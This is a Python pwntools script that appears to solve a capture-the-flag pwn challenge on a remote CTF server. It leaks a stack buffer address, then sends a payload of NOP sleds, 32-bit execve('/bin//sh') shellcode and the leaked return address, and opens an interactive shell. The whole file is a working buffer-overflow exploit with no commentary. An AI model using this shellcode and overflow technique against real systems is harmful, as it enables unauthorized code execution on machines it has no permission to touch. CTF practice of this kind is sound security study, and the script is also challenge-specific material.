#!/usr/bin/python3

import pwn

p = pwn.remote("ctf.j0n9hyun.xyz", 3006)

leak = "GYAUNNGABJAINSGU"
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

p.sendlineafter("Data : ", leak)
buf = int(p.recvuntil(":").decode('utf-8').strip(":"), 16)
pwn.log.info("buf address leaked: " + hex(buf))

p.sendlineafter("(y/n): ", "y")

payload = b"\x90"*54
payload += shellcode
payload += b"\x90"*61
payload += pwn.p32(buf)

p.sendlineafter("Data : ", payload)
p.sendlineafter("(y/n): ", "n")

p.interactive()
